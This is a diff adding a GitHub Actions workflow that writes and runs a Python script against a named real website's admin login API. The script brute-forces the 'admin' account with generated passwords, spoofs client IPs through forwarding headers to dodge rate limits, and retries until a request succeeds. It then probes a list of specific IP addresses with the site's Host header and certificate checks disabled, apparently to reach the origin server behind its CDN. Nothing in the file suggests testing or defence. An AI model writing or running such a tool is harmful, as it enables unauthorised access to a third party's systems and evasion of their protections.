@@ -1,0 +1,84 @@
+name: probe3
+on:
+  workflow_dispatch:
+    inputs:
+      n: {description: n, required: false, type: string, default: "30"}
+permissions:
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: probe3
+        env:
+          N: ${{ inputs.n }}
+        run: |
+          cat > /tmp/probe3.py <<'PYEOF'
+          import os,json,time,random,http.client,ssl,urllib.request,urllib.error
+          N=int(os.environ.get("N","30"))
+          UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
+          LOGIN="https://www.kufaka.com/adminApi/auth/login"
+          RND=random.Random(); defrip=lambda: "%d.%d.%d.%d"%(RND.randint(1,223),RND.randint(0,255),RND.randint(0,255),RND.randint(1,254))
+
+          def post_login(i, retries=1):
+              ip=defrip()
+              body=json.dumps({"username":"admin","password":"qx%d"%i}).encode()
+              for k in range(retries):
+                  req=urllib.request.Request(LOGIN, data=body, method="POST")
+                  req.add_header("Content-Type","application/json"); req.add_header("User-Agent",UA)
+                  req.add_header("Referer","https://www.kufaka.com/package/admin/"); req.add_header("Origin","https://www.kufaka.com")
+                  req.add_header("Accept","application/json, text/plain, */*")
+                  req.add_header("X-Forwarded-For",ip); req.add_header("CF-Connecting-IP",ip); req.add_header("X-Real-IP",ip)
+                  try:
+                      r=urllib.request.urlopen(req,timeout=25); st=r.status; b=r.read()
+                  except urllib.error.HTTPError as e:
+                      st=e.code
+                      try: b=e.read()
+                      except Exception: b=b""
+                  except Exception as e:
+                      st=-1; b=str(type(e).__name__).encode()
+                  if st==200: return (k+1, st, b[:120].decode('utf-8','ignore'))
+                  time.sleep(0.3)
+              return (retries, st, b[:120].decode('utf-8','ignore'))
+
+          print("== PART1: sequential single-shot ratio (N=%d, 1.0s spacing) =="%N,flush=True)
+          ok=0; codes={}
+          for i in range(N):
+              used,st,b=post_login(i,retries=1)
+              codes[st]=codes.get(st,0)+1
+              if st==200: ok+=1
+              print("P1 %d st=%s body=%s"%(i,st,b),flush=True)
+              time.sleep(1.0)
+          print("PART1_DONE ok=%d/%d codes=%s"%(ok,N,json.dumps(codes)),flush=True)
+
+          print("== PART2: retry-until-200 (12 tries each, 10 words) ==",flush=True)
+          rec=0
+          for i in range(10):
+              used,st,b=post_login(1000+i,retries=12)
+              if st==200: rec+=1
+              print("P2 %d tries_used=%d st=%s body=%s"%(i,used,st,b),flush=True)
+              time.sleep(1.0)
+          print("PART2_DONE recovered=%d/10"%rec,flush=True)
+
+          print("== PART3: direct-origin probes (Host: www.kufaka.com) ==",flush=True)
+          def op(ip,port,host,path,scheme):
+              try:
+                  if scheme=="https":
+                      ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+                      c=http.client.HTTPSConnection(ip,port,timeout=12,context=ctx)
+                  else:
+                      c=http.client.HTTPConnection(ip,port,timeout=12)
+                  c.request("GET",path,headers={"Host":host,"User-Agent":UA})
+                  r=c.getresponse(); b=r.read(200)
+                  print("ORIGIN %s://%s:%d Host=%s -> st=%s len=%d %r"%(scheme,ip,port,host,r.status,len(b),b[:160]),flush=True)
+              except Exception as e:
+                  print("ORIGIN %s://%s:%d Host=%s EXC %s"%(scheme,ip,port,host,type(e).__name__+":"+str(e)[:70]),flush=True)
+          ips=["38.97.254.214","175.12.98.143","20.55.95.139","172.215.216.197","4.149.236.228","40.124.148.96","154.222.19.143"]
+          for ip in ips:
+              op(ip,80,"www.kufaka.com","/","http")
+              op(ip,443,"www.kufaka.com","/","https")
+              op(ip,8080,"www.kufaka.com","/","http")
+          print("DONE",flush=True)
+          PYEOF
+          python3 /tmp/probe3.py
